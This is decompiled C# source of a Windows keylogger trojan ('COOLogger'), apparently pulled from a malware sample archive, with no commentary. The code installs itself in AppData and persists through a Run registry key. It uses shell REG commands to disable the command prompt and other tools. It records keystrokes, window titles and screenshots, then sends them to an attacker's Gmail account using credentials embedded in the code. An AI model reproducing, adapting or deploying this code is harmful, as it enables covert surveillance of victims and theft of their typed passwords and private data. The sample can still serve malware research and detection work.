// Decompiled with JetBrains decompiler
// Type: dUtJClTWqTXlvRe
// Assembly: lol, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A5B16BBB-9250-4817-95D9-6776F3176158
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00019-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-2a52a3fa27e70fc831d1e13d89484157ead37770e8ebaf28230d88c2635baabc.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

[StandardModule]
internal sealed class dUtJClTWqTXlvRe
{
  private static string REfBzcKbNRqRcWo = "Ym9vbWdvb2RnYW1lQGdtYWlsLmNvbQ==";
  private static string lJeDuqDUiErBZTw = "bm9vYm5vb2I=";
  private static string yfzFNDirrquSZgL = "smtp.gmail.com";
  private static int XXmqtlKZSCjmHjn = 587;
  private static string iIWPzhjEglyKerf;
  private static string RsPOpXoaeFfqkDz;
  private static string WsRJFQhwSGPmhLN;
  private static string tNTbQvFGEJgmtYl;
  private static string kBFHyYnfQxzUwCQ;
  private static string wmSabZeQJQuHHWa;
  private static int hsmFoLuGLITkyHI = 60000;
  private static string OkxMsLwBaOMGYVr = (string) null;
  private static object CyhuUUvEQsMrPhH = (object) Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
  private static string RpkNPvCVdTytusx = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
  private static MailMessage ipwNonEtvnNpUSB = new MailMessage();
  private static SmtpClient GkVRFaQHVfOOBnO = new SmtpClient();
  [AccessedThroughProperty("yieTneVisbbPBcy")]
  private static kxMsLwBaOMGYVrO _yieTneVisbbPBcy;
  private static object CORgCDMWRuKcwQK;
  private static RichTextBox dGkVRFaQHVfOOBn;

  static dUtJClTWqTXlvRe()
  {
    dUtJClTWqTXlvRe.yieTneVisbbPBcy = new kxMsLwBaOMGYVrO();
    dUtJClTWqTXlvRe.CORgCDMWRuKcwQK = (object) Path.GetFileName(Application.ExecutablePath);
    dUtJClTWqTXlvRe.dGkVRFaQHVfOOBn = new RichTextBox();
  }

  private static kxMsLwBaOMGYVrO yieTneVisbbPBcy
  {
    get => dUtJClTWqTXlvRe._yieTneVisbbPBcy;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      if (dUtJClTWqTXlvRe._yieTneVisbbPBcy != null)
        kxMsLwBaOMGYVrO.KeyDown -= new kxMsLwBaOMGYVrO.KeyDownEventHandler(dUtJClTWqTXlvRe.adUtJClTWqTXlvR);
      dUtJClTWqTXlvRe._yieTneVisbbPBcy = value;
      if (dUtJClTWqTXlvRe._yieTneVisbbPBcy == null)
        return;
      kxMsLwBaOMGYVrO.KeyDown += new kxMsLwBaOMGYVrO.KeyDownEventHandler(dUtJClTWqTXlvRe.adUtJClTWqTXlvR);
    }
  }

  [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetForegroundWindow();

  [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int tMYMJDVSpZjplxO(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

  [STAThread]
  public static void main()
  {
    dUtJClTWqTXlvRe.wmSabZeQJQuHHWa = Conversions.ToString(true);
    dUtJClTWqTXlvRe.WsRJFQhwSGPmhLN = Conversions.ToString(true);
    dUtJClTWqTXlvRe.tNTbQvFGEJgmtYl = Conversions.ToString(false);
    dUtJClTWqTXlvRe.kBFHyYnfQxzUwCQ = Conversions.ToString(false);
    dUtJClTWqTXlvRe.RsPOpXoaeFfqkDz = Conversions.ToString(true);
    dUtJClTWqTXlvRe.iIWPzhjEglyKerf = Conversions.ToString(true);
    if (!Operators.ConditionalCompareObjectEqual((object) Application.StartupPath, dUtJClTWqTXlvRe.CyhuUUvEQsMrPhH, false))
    {
      using (System.IO.File.Create(Conversions.ToString(Operators.ConcatenateObject(dUtJClTWqTXlvRe.CyhuUUvEQsMrPhH, (object) "\\ELbCBRHKCaEigOD.txt"))))
        ;
      StreamWriter streamWriter = new StreamWriter(dUtJClTWqTXlvRe.RpkNPvCVdTytusx + "\\ELbCBRHKCaEigOD.txt");
      streamWriter.Write(Application.ExecutablePath);
      streamWriter.Flush();
      streamWriter.Close();
      if (System.IO.File.Exists(Conversions.ToString(Operators.AddObject(Operators.AddObject(dUtJClTWqTXlvRe.CyhuUUvEQsMrPhH, (object) "\\"), dUtJClTWqTXlvRe.CORgCDMWRuKcwQK))))
      {
        MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString(Operators.AddObject(Operators.AddObject(dUtJClTWqTXlvRe.CyhuUUvEQsMrPhH, (object) "\\"), dUtJClTWqTXlvRe.CORgCDMWRuKcwQK)));
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Conversions.ToString(Operators.AddObject(Operators.AddObject(dUtJClTWqTXlvRe.CyhuUUvEQsMrPhH, (object) "\\"), dUtJClTWqTXlvRe.CORgCDMWRuKcwQK)));
      }
      else
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Conversions.ToString(Operators.AddObject(Operators.AddObject(dUtJClTWqTXlvRe.CyhuUUvEQsMrPhH, (object) "\\"), dUtJClTWqTXlvRe.CORgCDMWRuKcwQK)));
      NewLateBinding.LateCall((object) null, typeof (Process), "Start", new object[1]
      {
        Operators.AddObject(Operators.AddObject(dUtJClTWqTXlvRe.CyhuUUvEQsMrPhH, (object) "\\"), dUtJClTWqTXlvRe.CORgCDMWRuKcwQK)
      }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
      ProjectData.EndApp();
    }
    if (Conversions.ToBoolean(dUtJClTWqTXlvRe.iIWPzhjEglyKerf) && RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).GetValue(Conversions.ToString(dUtJClTWqTXlvRe.CORgCDMWRuKcwQK))) == null)
      MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Conversions.ToString(dUtJClTWqTXlvRe.CORgCDMWRuKcwQK), Operators.ConcatenateObject(Operators.ConcatenateObject(dUtJClTWqTXlvRe.CyhuUUvEQsMrPhH, (object) "\\"), dUtJClTWqTXlvRe.CORgCDMWRuKcwQK));
    if (Conversions.ToBoolean(dUtJClTWqTXlvRe.RsPOpXoaeFfqkDz))
    {
      try
      {
        MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString((object) MyProject.Computer.FileSystem.ReadAllText(Conversions.ToString(Operators.ConcatenateObject(dUtJClTWqTXlvRe.CyhuUUvEQsMrPhH, (object) "\\ELbCBRHKCaEigOD.txt")))));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    if (Conversions.ToBoolean(dUtJClTWqTXlvRe.WsRJFQhwSGPmhLN))
      Interaction.Shell("REG add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus);
    if (Conversions.ToBoolean(dUtJClTWqTXlvRe.tNTbQvFGEJgmtYl))
      Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus);
    if (Conversions.ToBoolean(dUtJClTWqTXlvRe.kBFHyYnfQxzUwCQ))
      Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus);
    System.Windows.Forms.Timer timer1 = new System.Windows.Forms.Timer();
    timer1.Interval = 60000;
    timer1.Tick += new EventHandler(dUtJClTWqTXlvRe.LZHYKOocaUmjGbz_Ticked);
    timer1.Start();
    System.Windows.Forms.Timer timer2 = new System.Windows.Forms.Timer();
    timer2.Interval = 300;
    timer2.Tick += new EventHandler(dUtJClTWqTXlvRe.GCORgCDMWRuKcwQ_Ticked);
    timer2.Start();
    dUtJClTWqTXlvRe.yieTneVisbbPBcy.msozDSnoyIDgwPj();
    Application.Run();
  }

  private static string PkmvTBetagzIxdY()
  {
    string lpString = new string(char.MinValue, 100);
    dUtJClTWqTXlvRe.tMYMJDVSpZjplxO(dUtJClTWqTXlvRe.GetForegroundWindow(), ref lpString, 100);
    return lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
  }

  public static string eREfBzcKbNRqRcW(string LXXmqtlKZSCjmHj) => Encoding.ASCII.GetString(Convert.FromBase64String(LXXmqtlKZSCjmHj));

  public static void LZHYKOocaUmjGbz_Ticked(object sender, EventArgs e)
  {
    if (Conversions.ToBoolean(dUtJClTWqTXlvRe.wmSabZeQJQuHHWa))
    {
      Size blockRegionSize = new Size(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Bitmap bitmap = new Bitmap(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
      string Right = dUtJClTWqTXlvRe.jDwmSabZeQJQuHH(6);
      bitmap.Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(dUtJClTWqTXlvRe.CyhuUUvEQsMrPhH, (object) "\\"), (object) Right), (object) ".jpeg")));
      try
      {
        MailMessage message = new MailMessage();
        Attachment attachment = new Attachment(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(dUtJClTWqTXlvRe.CyhuUUvEQsMrPhH, (object) "\\"), (object) Right), (object) ".jpeg")));
        message.From = new MailAddress(dUtJClTWqTXlvRe.eREfBzcKbNRqRcW(dUtJClTWqTXlvRe.REfBzcKbNRqRcWo));
        message.To.Add(dUtJClTWqTXlvRe.eREfBzcKbNRqRcW(dUtJClTWqTXlvRe.REfBzcKbNRqRcWo));
        message.Subject = "COOLogger Logs From - " + Environment.UserName;
        message.Body = dUtJClTWqTXlvRe.dGkVRFaQHVfOOBn.Text;
        message.Attachments.Add(attachment);
        SmtpClient smtpClient = new SmtpClient("smtp.gmail.com")
        {
          Port = 587,
          EnableSsl = true,
          Credentials = (ICredentialsByHost) new NetworkCredential(dUtJClTWqTXlvRe.eREfBzcKbNRqRcW(dUtJClTWqTXlvRe.REfBzcKbNRqRcWo), dUtJClTWqTXlvRe.eREfBzcKbNRqRcW(dUtJClTWqTXlvRe.lJeDuqDUiErBZTw))
        };
        smtpClient.EnableSsl = true;
        smtpClient.Send(message);
        dUtJClTWqTXlvRe.dGkVRFaQHVfOOBn.Text = "";
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    else
    {
      MailMessage ipwNonEtvnNpUsb = dUtJClTWqTXlvRe.ipwNonEtvnNpUSB;
      ipwNonEtvnNpUsb.From = new MailAddress(dUtJClTWqTXlvRe.eREfBzcKbNRqRcW(dUtJClTWqTXlvRe.REfBzcKbNRqRcWo));
      ipwNonEtvnNpUsb.To.Add(dUtJClTWqTXlvRe.eREfBzcKbNRqRcW(dUtJClTWqTXlvRe.REfBzcKbNRqRcWo));
      ipwNonEtvnNpUsb.Subject = "COOLogger Logs from - " + Environment.UserName;
      ipwNonEtvnNpUsb.Body = dUtJClTWqTXlvRe.dGkVRFaQHVfOOBn.Text;
      SmtpClient gkVrFaQhVfOoBnO = dUtJClTWqTXlvRe.GkVRFaQHVfOOBnO;
      gkVrFaQhVfOoBnO.Host = "smtp.gmail.com";
      gkVrFaQhVfOoBnO.Port = 587;
      gkVrFaQhVfOoBnO.EnableSsl = true;
      gkVrFaQhVfOoBnO.Credentials = (ICredentialsByHost) new NetworkCredential(dUtJClTWqTXlvRe.eREfBzcKbNRqRcW(dUtJClTWqTXlvRe.REfBzcKbNRqRcWo), dUtJClTWqTXlvRe.eREfBzcKbNRqRcW(dUtJClTWqTXlvRe.lJeDuqDUiErBZTw));
      gkVrFaQhVfOoBnO.Send(dUtJClTWqTXlvRe.ipwNonEtvnNpUSB);
      dUtJClTWqTXlvRe.dGkVRFaQHVfOOBn.Text = "";
    }
  }

  public static void adUtJClTWqTXlvR(Keys e) => dUtJClTWqTXlvRe.dGkVRFaQHVfOOBn.Text += dUtJClTWqTXlvRe.yieTneVisbbPBcy.DwmSabZeQJQuHHW(e);

  public static void GCORgCDMWRuKcwQ_Ticked(object sender, EventArgs e)
  {
    if (Operators.CompareString(dUtJClTWqTXlvRe.OkxMsLwBaOMGYVr, dUtJClTWqTXlvRe.PkmvTBetagzIxdY(), false) == 0)
      return;
    dUtJClTWqTXlvRe.OkxMsLwBaOMGYVr = dUtJClTWqTXlvRe.PkmvTBetagzIxdY();
    if (Operators.CompareString(dUtJClTWqTXlvRe.OkxMsLwBaOMGYVr, "", false) == 0)
      return;
    RichTextBox dGkVrFaQhVfOoBn = dUtJClTWqTXlvRe.dGkVRFaQHVfOOBn;
    dGkVrFaQhVfOoBn.Text = dGkVrFaQhVfOoBn.Text + "\r\n\r\n~~~~~" + dUtJClTWqTXlvRe.OkxMsLwBaOMGYVr + " (" + DateAndTime.Now.ToLongTimeString() + ")~~~~~\r\n";
  }

  public static string jDwmSabZeQJQuHH(int lenght)
  {
    VBMath.Randomize();
    StringBuilder stringBuilder = new StringBuilder("");
    char[] charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
    int num1 = lenght;
    int num2 = 1;
    while (num2 <= num1)
    {
      VBMath.Randomize();
      int index = checked ((int) Math.Round((double) unchecked (Conversion.Int((float) checked (charArray.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f)));
      stringBuilder.Append(charArray[index]);
      checked { ++num2; }
    }
    return stringBuilder.ToString();
  }
}
